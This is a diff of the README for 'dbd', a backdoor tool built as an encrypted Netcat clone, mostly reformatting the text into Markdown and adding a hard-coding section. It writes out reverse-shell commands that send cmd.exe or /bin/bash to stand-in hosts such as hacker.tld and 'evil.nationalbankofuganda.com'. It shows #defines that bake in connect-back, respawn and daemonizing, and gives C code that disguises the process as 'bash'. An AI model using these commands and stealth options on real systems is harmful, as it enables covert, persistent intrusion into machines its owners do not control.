@@ -1,146 +1,170 @@
-                          d8888b. d8888b. d8888b.
-                          88  `8D 88  `8D 88  `8D
-                          88   88 88oooY' 88   88
-                          88   88 88~~~b. 88   88
-                          88  .8D 88   8D 88  .8D
-                          Y8888D' Y8888P' Y8888D'
+						  d8888b. d8888b. d8888b.
+						  88  `8D 88  `8D 88  `8D
+						  88   88 88oooY' 88   88
+						  88   88 88~~~b. 88   88
+						  88  .8D 88   8D 88  .8D
+						  Y8888D' Y8888P' Y8888D'
 
-    Copyright (C) 2012 Kyle Barnthouse <durandal@gitbrew.org>
-                    dbd is distributed under the GNU GPL
+#[Durandal's Backdoor](http://gitbrew.org/dbd)
+##Copyright (C) 2012 Kyle Barnthouse [<durandal@gitbrew.org>](mailto:durandal@gitbrew.org)
+##dbd is distributed under the GNU GPL
 
 
-SYNOPSIS
-~~~~~~~~
+###SYNOPSIS
 
-dbd is a Netcat-clone, designed to be portable and offer strong encryption. It
-runs on Unix-like operating systems and on Microsoft Win32. dbd features
-AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution
-(-e option), choosing source port, continuous reconnection with delay, and
-some other nice features. dbd supports TCP/IP communication only. Source code
-and binaries are distributed under the GNU General Public License.
+dbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. dbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. dbd supports TCP/IP communication only. Source code and binaries are distributed under the GNU General Public License.
 
-COMPILATION
-~~~~~~~~~~~
+###COMPILATION
 
-To compile dbd under a Unix-like operating system you need gcc and relevant
-development tools. For Linux, FreeBSD, NetBSD, OpenBSD (and possibly others),
-type:
-    $ make unix
+	$ make
+	usage:
+	  make unix     - Linux, NetBSD, FreeBSD, OpenBSD
+	  make sunos    - SunOS (Solaris)
+	  make win32    - native win32 console app (w/ Cygwin + MinGW)
+	  make win32bg  - create a native win32 no-console app (w/ Cygwin + MinGW)
+	  make win32bg CFLAGS=-DSTEALTH - stealthy no-console app
+	  make mingw    - native win32 console app (w/ MinGW MSYS)
+	  make mingwbg  - native win32 no-console app (w/ MinGW MSYS)
+	  make mingwbg CFLAGS=-DSTEALTH - stealthy no-console app (w/ MinGW MSYS)
+	  make cygwin   - Cygwin console app
+	  make darwin   - Darwin
+
+	roll up a tarball (move your compiled stuff to binaries/ first:
+	  make dist     - create tarball with source files, readme, and binaries/
+
+To compile dbd under a Unix-like operating system you need gcc and relevant development tools. For Linux, FreeBSD, NetBSD, OpenBSD (and possibly others), type:
+
+	$ make unix
 
 For SunOS/Solaris, type:
-    $ make sunos
 
-To compile dbd under Microsoft Windows (NT/2K/XP/2K3) you need MinGW+MSYS, or
-Cygwin with full development support (Cygwin's MinGW gcc). To compile a native
-Win32 dbd console application under Cygwin, type:
+	$ make sunos
 
-    $ make win32
+To compile dbd under Microsoft Windows (NT/2K/XP/2K3) you need MinGW+MSYS, or Cygwin with full development support (Cygwin's MinGW gcc). To compile a native Win32 dbd console application under Cygwin, type:
 
-    or, under MSYS:
+	$ make win32
 
-    $ make mingw
+or, under MSYS:
+
+	$ make mingw
 
 To compile a no-console ("WinMain") application under Cygwin, type:
 
-    $ make win32bg
+	$ make win32bg
 
-    or, under MSYS:
+or, under MSYS:
 
-    $ make mingwbg
+	$ make mingwbg
 
 To compile a Cygwin-specific console application, type:
 
-    $ make cygwin
+	$make cygwin
 
+You may want to change the default behaviour of dbd. One of the most important thing is to change the default shared secret to your own pass phrase. Edit dbd.h and replace with your preferences. You may, for example, want to hardcode a host + port to connect to if dbd is started without options. Complete examples are provided in dbd.h.
 
-You may want to change the default behaviour of dbd. One of the most important
-thing is to change the default shared secret to your own pass phrase. Edit
-dbd.h and replace with your preferences. You may, for example, want to
-hardcode a host + port to connect to if dbd is started without options.
-Complete examples are provided in dbd.h.
-
-
-SAMPLE USES
-~~~~~~~~~~~
+###SAMPLE USES
 
 With a little imagination, dbd can be used for many things...
+* Use dbd to securely transfer files between two networks:
 
-    * Use dbd to securely transfer files between two networks:
+	snafu$ dbd -l -p 12345 -k secret > output.file
 
-        snafu$ dbd -l -p 12345 -k secret > output.file
+	fubar$ cat input.file | dbd -k secret snafu 12345
 
-        fubar$ cat input.file | dbd -k secret snafu 12345
+or from win32:
 
-        or from win32:
-        C:\somedir>type input.fil | dbd -k secret snafu 12345
+	C:\somedir>type input.fil | dbd -k secret snafu 12345
 
-    * Use dbd as a simple (but secure) chat:
+* Use dbd as a simple (but secure) chat:
 
-        snafu$ dbd -P snafu -Hon fubar 1234
+	snafu$ dbd -P snafu -Hon fubar 1234
 
-        fubar$ dbd -Pfubar -Hon -l -p 1234
+	fubar$ dbd -Pfubar -Hon -l -p 1234
 
-    * Use dbd as a pen-test backdoor:
+* Use dbd as a pen-test backdoor:
 
-        C:\hacked box>dbdbg.exe -r1800 -q -e cmd.exe hacker.tld 443
-        ...
+	C:\hacked box>dbdbg.exe -r1800 -q -e cmd.exe hacker.tld 443
+	...
 
-        or under Unix-like OSes:
+or under Unix-like OSes:
 
-        root@owned# ./dbd -r1800 -Don -e /bin/bash hacker.tld 993
+	root@owned# ./dbd -r1800 -Don -e /bin/bash hacker.tld 993
 
-WARNING
-~~~~~~~
+###HARD CODING OPTIONS
 
-Do not pass cached input (a file with commands or similar) to a listening "dbd
--e" session. "dbd -e" is using pipes to pass data between the program being
-executed and dbd. Pipes are used (instead of plain pass-through duplicate file
-descriptors) because of encryption between the pipes and the socket. In order
-to prevent the writing end of one of the pipes from blocking the whole
-process, I turned it into a non-blocking descriptor. There is a chance that
-when passing too much input at a time through to the -e program, it will be
-truncated (cut off) since the pipe buffer (in the OS) can't hold all of the
-data. This problem can be solved by making dbd multi-threaded for instance,
-but I'll avoid this as long as possible for compatibility reasons.
+In addition to using command line options, you can hard code variables by using #defines in dbd.h. To do this, set the variables you wish to use as named constants and compile as normal. For example, if you wanted to hard code a dbd executable that connected back to "evil.nationalbankofuganda.com" on port 995, and executed "/bin/bash" you could run:
 
+	root@owned# ./dbd -e /bin/bash evil.nationalbankofuganda.com 995
 
-LICENSE
-~~~~~~~
+or using hard-coded #defines, you could edit dbd.h:
 
-dbd Copyright (C) 2012 Kyle Barnthouse <durandal@gitbrew.org>
+	#define DOLISTEN 0
+	#define HOST "evil.nationalbankofuganda.com"
+	#define PORT 995
+	#define EXECPROG "/bin/bash"
 
-This program is free software; you can redistribute it and/or modify it under
-the terms of the GNU General Public License as published by the Free Software
-Foundation; either version 2 of the License, or (at your option) any later
-version.
+	You can also set respawn and stealth options to help maintain your connection:
 
-This program is distributed in the hope that it will be useful, but WITHOUT
-ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
-FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
-details.
+	#define RESPAWN_ENABLED 1
+	#define RESPAWN_INTERVAL 900
+	#define QUIET 1
+	#define DAEMONIZE 1
 
-You should have received a copy of the GNU General Public License along with
-this program; if not, write to the Free Software Foundation, Inc., 59 Temple
-Place, Suite 330, Boston, MA  02111-1307  USA
+This will set the connection to daemonize ("melt" in malware terms), never send output to STDOUT, and attempt to respawn the connection every 15 minutes should it ever disconnect from the listener.
+	ROMULAN CLOAKING TECHNOLOGY
+
+Now we're getting into the fun stuff. Once you are a mastar at hard-coding options into your backdoor, you can use what is quite possibly the most fun named constant at our disposal: CLOAK. To do this, simply set the value:
+
+	#define CLOAK 1
+
+NOTE: this currently only works on *nix compiles. Eventually I plan on adding Win32 process migration/hooking so those targets can feel some Romulan love as well.
+
+For *nix environments, this option scrubs argv[0] and replaces it with the string "bash\0". It also scrubs all other argv[]'s (it'd look silly if ps returned "bash -e /bin/bash someremotehost.com 443" now wouldn't it?) I hope it goes without saying that you CANNOT USE THIS OPTION UNLESS YOU ARE HARD CODING YOUR VARIABLES INTO DBD.H. Also, if you're testing this on your own system it's gonna be fun picking the right pid to kill. ;)
+
+Feel free to use this scrubber in anything you happen to be working on:
+
+	//grab our named constant
+	int cloak = CLOAK;
+
+	//Engage cloaking device
+	if(cloak)
+	{
+		#ifdef WIN32
+		//stub              
+		#else
+		//change argv[0] to say bash       
+		int scrub;
+		strncpy((char *)argv[0], "\0", strlen((char *)argv[0]) + 1);
+		strcpy((char *)argv[0], "bash\0");    
+		for (scrub = 1; scrub < argc; scrub++)
+		{                     
+			 strncpy((char *)argv[scrub], "\0", strlen((char *)argv[scrub]) + 1);
+		}                 
+		#endif
+	}
+
+###WARNING
+
+Do not pass cached input (a file with commands or similar) to a listening "dbd -e" session. "dbd -e" is using pipes to pass data between the program being executed and dbd. Pipes are used (instead of plain pass-through duplicate file descriptors) because of encryption between the pipes and the socket. In order to prevent the writing end of one of the pipes from blocking the whole process, I turned it into a non-blocking descriptor. There is a chance that when passing too much input at a time through to the -e program, it will be truncated (cut off) since the pipe buffer (in the OS) can't hold all of the data. This problem can be solved by making dbd multi-threaded for instance, but I'll avoid this as long as possible for compatibility reasons.
+LICENSE  
+---
+dbd Copyright (C) 2012 Kyle Barnthouse durandal@gitbrew.org
+
+This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version.
+
+This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License along with this program; if not, write to the Free Software Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
 
 See the COPYING file for more information.
+---
+dbd's AES-CBC-128 + HMAC-SHA1 implementation is Copyright (C) Christophe Devine devine@cr0.net and is distributed under the GNU General Public License (GPL).
 
---
+Some code (for doexec_win32.h) has been derived from doexec.c from the Win32 port of Netcat (C) Weld Pond and hobbit. Parts of doexec.c is Copyright (C) 1994 Nathaniel W. Mishkin (doexec.c code was originally derived from rlogind.exe).
 
-dbd's AES-CBC-128 + HMAC-SHA1 implementation is Copyright (C) Christophe
-Devine <devine@cr0.net> and is distributed under the GNU General Public
-License (GPL).
-
-Some code (for doexec_win32.h) has been derived from doexec.c from the Win32
-port of Netcat (C) Weld Pond and *hobbit*. Parts of doexec.c is Copyright (C)
-1994 Nathaniel W. Mishkin (doexec.c code was originally derived from
-rlogind.exe).
-
-The original version of Netcat was written by *hobbit* <hobbit@avian.org>. The
-NT version was done by Weld Pond <weld@l0pht.com>.
-
---
-Kyle Barnthouse <durandal@gitbrew.org>
-Security Consultant
-gitbrew.org
-
+The original version of Netcat was written by hobbit hobbit@avian.org. The NT version was done by Weld Pond weld@l0pht.com.
+---
+Kyle Barnthouse [<durandal@gitbrew.org>](mailto:durandal@gitbrew.org)  
+Security Consultant  
+[gitbrew.org](http://gitbrew.org)  
+[Hephaestus Security](http://hephaestussec.com)
